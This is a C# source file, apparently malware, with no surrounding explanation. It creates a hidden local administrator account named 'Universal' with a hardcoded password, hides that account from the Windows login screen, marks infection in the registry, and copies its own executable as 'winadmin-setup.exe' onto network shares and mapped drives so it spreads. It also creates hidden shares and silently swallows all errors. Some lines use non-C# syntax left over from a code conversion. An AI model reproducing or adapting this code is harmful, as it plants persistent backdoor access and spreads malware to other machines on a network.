using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Windows.Forms;
using Microsoft.Win32;
using System.DirectoryServices;
using System.Management;


static class LAN
{
    public static string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
    public static bool chkIt()
    {
        string regstr = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Universal", "Universal", "Universal");
        if (regstr == "Universal")
            return true;
        else
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
            RegistryKey newkey = key.CreateSubKey("Universal");
            newkey.SetValue("Universal", me);
            return false;
        }
    }
    public static void UniversalUser()
    {
        try
        {
            DirectoryEntry ad = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
            DirectoryEntry usr = ad.Children.Add("Universal", "user");
            usr.Invoke("SetPassword", new object[] { "Universalwashere" });
            usr.CommitChanges();

            DirectoryEntry de;
            de = ad.Children.Find("Administrators", "group");
            if (de != null)
                de.Invoke("Add", new object[] { usr.Path.ToString() });

            try
            {
                string rkey = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList";
                Registry.SetValue(rkey, "Universal", 0, RegistryValueKind.DWord);
            }
            catch (Exception er)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    public static void Share()
    {
        try
        {
            ManagementObjectSearcher shares = new ManagementObjectSearcher("select * from win32_share");
            foreach (ManagementObject serv in shares.Get())
            {
                string shareName = Convert.ToString(serv("Name"));
                if (!shareName.Contains("$"))
                    File.Copy(me, (@"\\" + Environment.MachineName + @"\") + shareName + @"\winadmin-setup.exe", true);
            }
        }
        catch (Exception ex)
        {
        }


        try
        {
            string key = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU\";
            RegistryKey reg = Registry.CurrentUser.OpenSubKey(key);


            foreach (string valuename in reg.GetValueNames())
            {
                string path = reg.GetValue(valuename).ToString();
                if (valuename.ToLower() != "mrulist")
                {
                    try
                    {
                        File.Copy(me, path + @"\\winadmin-setup.exe", true);
                    }
                    catch (Exception er)
                    {
                    }
                }
            }
            reg.Close();
        }
        catch (Exception er)
        {
        }
    }
    public static void CreateShare(string dir, string name)
    {
        try
        {
            Directory.CreateDirectory(dir);
            ManagementClass managementClass = new ManagementClass("Win32_Share");
            ManagementBaseObject inParams = managementClass.GetMethodParameters("Create");
            ManagementBaseObject outParams;
            inParams("Description") = name;
            inParams("Name") = name;
            inParams("Path") = dir;
            inParams("Type") = 0x0;
            outParams = managementClass.InvokeMethod("Create", inParams, null/* TODO Change to default(_) if this is not a reference type */);
            if (System.Convert.ToInt64((outParams.Properties("ReturnValue").Value)) == 0)
            {
                if (Directory.Exists(dir))
                {
                    DirectoryInfo d = new DirectoryInfo(dir);
                    d.Attributes = FileAttributes.Hidden;
                }
            }
        }
        catch (Exception e)
        {
        }
    }
}
